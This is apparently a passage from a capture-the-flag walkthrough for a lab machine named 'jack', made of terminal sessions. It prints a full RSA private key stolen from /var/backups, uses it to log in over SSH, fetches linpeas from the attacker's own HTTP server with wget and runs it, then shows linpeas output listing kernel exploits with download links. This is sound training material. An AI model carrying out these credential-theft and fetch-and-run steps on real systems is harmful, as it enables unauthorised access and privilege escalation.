www-data@jack:/var/backups$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAxfBR9F9V5G2snv1Xaaxv3VHbFZ2VZRwGyU+ah6komBeaAldr
8SNK1x0wu/eXjLjrWnVaYOEU2YUrHzn/duB3Wvm8xyA0T8x/WbV2osWaVOafkPSv
YpV4OdQrdRoS3PEOXRnS+CnOTAgPWo2+xfH1XeldFw9XiYrprTugmwCcYDuBZB3r
zmWA8sPWjLjs6xzNK26RQQbo9zaxwfEdjZ3an9JngJJ7m0rtF9vKeCRfO1V8sd/t
1lu96Kqn4FZUTXQFEGfAYupG6b3vpRwqmI6y2VjK5MxlMmEdwP8oxmKR4XRqvSK1
8m5byz8ZUu1RfB8Ug/pKK9VVbk9QFWbrV4E3FwIDAQABAoIBAEEr0TAOu68MVUu7
yi4m8mYCb4n8apXx1mIt7YlBLvZ0vuaKdiXdIuUU3VjmOmXA9OzButIvCbhc2kfb
xrsTSPkRRRCjD9Y+VKfq0XbibOALVvpZNe3VnNIdg3l47kEEtV/+ArJmwV/TP4rn
JKrz8X/MODRBfubwb+Pzv/uJBfPAzvkokKUp9D2LqNjQEY4w71j0yUl+A0xnkT4i
L1FbzghdARExy2cJN0RfdDKhy/DfXos7+JHso3ZvXmSx0ivS+HyCblO25Kcmy4Vh
FZotNk+28iw6DKm1wrgAjj0sdLpB6jW9+M/kSQCovMijPM8h8JNPLNOJMFSKWBH8
m9US/XECgYEA+AW0bbMVoylAcWGold85Ileyuw/q3HwsDdRrO43uMZvQe8f5TRsd
Q9SvAEz9T46YErySq33jOPmsGLf02EEiyGggpBiuhi3FmtMa7440qGFig4Q5IVxn
QuSDUQvxN/uVE+TZxlRPTUeAFPcAI4DAUYbubAcJzvXeAsCPsKbQGw0CgYEAzE42
H8SUWiCMXBMotEUpn14pGcP4O+hei9j7P1Nupy/F63UtYPvXN4oi75YeLiInUXzU
S/r3+AxoNafMAy67oQhLKHXs+NOP5aEkVhNDhHFNpWutYPn9aLWUIx1tXbWsaecE
i7OCxjp0L5lDRVl3TLzXeZmtp0oSAPKNRYmgQbMCgYAvL0aoKA3RwKNV7rJX8OO5
uN1z4Q9ZavYmm2bbKaFLJs1+/whatvHWWbwBXqRCYmpkBiQRJB36VOV8vmKCUcIA
Rm8PSPLK7CJP1iGluXQjJIPNaXZE9oNeooKpBJCbie1On5ceuCNuHFAtrOAF4RS1
beol+yDOks/tzhyICvREcQKBgCHIiRClu/ZPTYZoMKHmkeRleJxnGGQnn4K2hY1K
KZEByFOQE8nmuwbXE8HUa/cq9J936c8Kl/hvbMf6kDSyhJozOeJd5aqbqT7Kb6zA
ELkU10cUUB4qGGo5JF7OHeiSAwmcBtdm/qfywIWibUpJaf3JeEQGUn3INMPtV8j4
4gQbAoGBAKuXPITKuO7SsRfXcwB3MO3iCTLdW7BYnYF1SzVbPBonmcsxlQinvoRg
2faWmSFAUK6cIys9za3pzOw3FP8W9Q5SGsA9KriSYj6/h7ei9GeJAr3mxlbGnkZN
ZFqUVe2Jvxq++O6Ub41zUtWINbR5Fxf+kTlJIIwqc6IuzZq+QWXy
-----END RSA PRIVATE KEY-----
```
```rb
┌──(kali㉿kali)-[~]
└─$ nano id_rsa_jack
```
```rb
┌──(kali㉿kali)-[~]
└─$ cat id_rsa_jack 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAxfBR9F9V5G2snv1Xaaxv3VHbFZ2VZRwGyU+ah6komBeaAldr
8SNK1x0wu/eXjLjrWnVaYOEU2YUrHzn/duB3Wvm8xyA0T8x/WbV2osWaVOafkPSv
YpV4OdQrdRoS3PEOXRnS+CnOTAgPWo2+xfH1XeldFw9XiYrprTugmwCcYDuBZB3r
zmWA8sPWjLjs6xzNK26RQQbo9zaxwfEdjZ3an9JngJJ7m0rtF9vKeCRfO1V8sd/t
1lu96Kqn4FZUTXQFEGfAYupG6b3vpRwqmI6y2VjK5MxlMmEdwP8oxmKR4XRqvSK1
8m5byz8ZUu1RfB8Ug/pKK9VVbk9QFWbrV4E3FwIDAQABAoIBAEEr0TAOu68MVUu7
yi4m8mYCb4n8apXx1mIt7YlBLvZ0vuaKdiXdIuUU3VjmOmXA9OzButIvCbhc2kfb
xrsTSPkRRRCjD9Y+VKfq0XbibOALVvpZNe3VnNIdg3l47kEEtV/+ArJmwV/TP4rn
JKrz8X/MODRBfubwb+Pzv/uJBfPAzvkokKUp9D2LqNjQEY4w71j0yUl+A0xnkT4i
L1FbzghdARExy2cJN0RfdDKhy/DfXos7+JHso3ZvXmSx0ivS+HyCblO25Kcmy4Vh
FZotNk+28iw6DKm1wrgAjj0sdLpB6jW9+M/kSQCovMijPM8h8JNPLNOJMFSKWBH8
m9US/XECgYEA+AW0bbMVoylAcWGold85Ileyuw/q3HwsDdRrO43uMZvQe8f5TRsd
Q9SvAEz9T46YErySq33jOPmsGLf02EEiyGggpBiuhi3FmtMa7440qGFig4Q5IVxn
QuSDUQvxN/uVE+TZxlRPTUeAFPcAI4DAUYbubAcJzvXeAsCPsKbQGw0CgYEAzE42
H8SUWiCMXBMotEUpn14pGcP4O+hei9j7P1Nupy/F63UtYPvXN4oi75YeLiInUXzU
S/r3+AxoNafMAy67oQhLKHXs+NOP5aEkVhNDhHFNpWutYPn9aLWUIx1tXbWsaecE
i7OCxjp0L5lDRVl3TLzXeZmtp0oSAPKNRYmgQbMCgYAvL0aoKA3RwKNV7rJX8OO5
uN1z4Q9ZavYmm2bbKaFLJs1+/whatvHWWbwBXqRCYmpkBiQRJB36VOV8vmKCUcIA
Rm8PSPLK7CJP1iGluXQjJIPNaXZE9oNeooKpBJCbie1On5ceuCNuHFAtrOAF4RS1
beol+yDOks/tzhyICvREcQKBgCHIiRClu/ZPTYZoMKHmkeRleJxnGGQnn4K2hY1K
KZEByFOQE8nmuwbXE8HUa/cq9J936c8Kl/hvbMf6kDSyhJozOeJd5aqbqT7Kb6zA
ELkU10cUUB4qGGo5JF7OHeiSAwmcBtdm/qfywIWibUpJaf3JeEQGUn3INMPtV8j4
4gQbAoGBAKuXPITKuO7SsRfXcwB3MO3iCTLdW7BYnYF1SzVbPBonmcsxlQinvoRg
2faWmSFAUK6cIys9za3pzOw3FP8W9Q5SGsA9KriSYj6/h7ei9GeJAr3mxlbGnkZN
ZFqUVe2Jvxq++O6Ub41zUtWINbR5Fxf+kTlJIIwqc6IuzZq+QWXy
-----END RSA PRIVATE KEY-----
```
```rb
┌──(kali㉿kali)-[~]
└─$ chmod 600 id_rsa_jack
```
```rb
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa_jack jack@10.10.12.106
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

143 packages can be updated.
92 updates are security updates.

Last login: Mon Nov 16 14:27:49 2020 from 10.11.12.223
jack@jack:~$ id
uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)
```
```rb
┌──(kali㉿kali)-[~/Downloads]
└─$ locate pspy     
/home/kali/hackthebox/pspy64s
/home/kali/nappy/pspy64s
```
```rb
┌──(kali㉿kali)-[~/Downloads]
└─$ cd ../hackthebox
```
```rb
┌──(kali㉿kali)-[~/hackthebox]
└─$ ls         
allowed.userlist                        gato.jpg_original  nc64.exe           Responder
allowed.userlist.passwd                 hash_vaccine       privesc_creds.xml  revshell.php
backup.zip                              hash_zip           prod.dtsConfig     rogue-jndi
car.py                                  id_rsa             pspy64s            share
exploit_redpanda.py                     index.php          racecar            style.css
ferox-http_shoppy_htb-1667929122.state  josh.hash          racecar.zip        winPEASx64.exe
gato.jpg                                linpeas.sh         r.elf              woodenk@10.10.11.170
```
```rb
┌──(kali㉿kali)-[~/hackthebox]
└─$ python3 -m http.server 8000                                                     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

ack@jack:~/.ssh$ cd ..
jack@jack:~$ ls
reminder.txt  user.txt
jack@jack:~$ cd /tmp
jack@jack:/tmp$ wget http://10.8.19.103:8000/linpeas.sh
--  http://10.8.19.103:8000/linpeas.sh
Connecting to 10.8.19.103:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 777018 (759K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh            100%[=======================>] 758.81K   608KB/s    in 1.2s    

(608 KB/s) - ‘linpeas.sh’ saved [777018/777018]

jack@jack:/tmp$ chmod +x linpeas.sh;./linpeas.sh

jack@jack:/tmp$ ./linpeas.sh 

                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |
    |---------------------------------------------------------------------------| 
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter   :     @carlospolopm                           |
    |         Respect on HTB      :     SirBroccoli                             |
    |---------------------------------------------------------------------------|
    |                                 Thank you!                                |
    \---------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
OS: Linux version 4.4.0-142-generic (buildd@lgw01-amd64-033) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
User & Groups: uid=1000(jack) gid=1000(jack) groups=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),115(lpadmin),116(sambashare),1001(family)
Hostname: jack
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════
                                        ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.4.0-142-generic (buildd@lgw01-amd64-033) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.10) ) #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.6 LTS
Release:	16.04
Codename:	xenial

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.16

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

./linpeas.sh: 1197: ./linpeas.sh: [[: not found
./linpeas.sh: 1197: ./linpeas.sh: rpm: not found
./linpeas.sh: 1197: ./linpeas.sh: 0: not found
./linpeas.sh: 1207: ./linpeas.sh: [[: not found

╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/home/jack/bin:/home/jack/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
New path exported: /home/jack/bin:/home/jack/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

╔══════════╣ Date & uptime
Wed Jan 18 15:16:23 CST 2023
 15:16:23 up 27 min,  2 users,  load average: 0.19, 0.15, 0.38

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices
UUID=67a0c1f9-b482-40ba-8e93-f188d141fe64	/	ext4	errors=remount-ro	0 1
UUID=5aa0286c-eea1-44e2-b918-7041334f10a1	none	swap	sw	0 0

╔══════════╣ Environment
╚ Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
MAIL=/var/mail/jack
SSH_CLIENT=10.8.19.103 39380 22
USER=jack
SHLVL=1
OLDPWD=/home/jack
HOME=/home/jack
SSH_TTY=/dev/pts/1
LOGNAME=jack
_=./linpeas.sh
XDG_SESSION_ID=16
TERM=xterm-256color
PATH=/home/jack/bin:/home/jack/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1000
LANG=en_US.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=/tmp
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_CONNECTION=10.8.19.103 39380 10.10.12.106 22
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security//3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security//1
   Exposure: probable
   Tags: ubuntu=14.04{kernel:4.4.0-*},[ ubuntu=16.04 ]{kernel:4.8.0-*}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security//1
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled
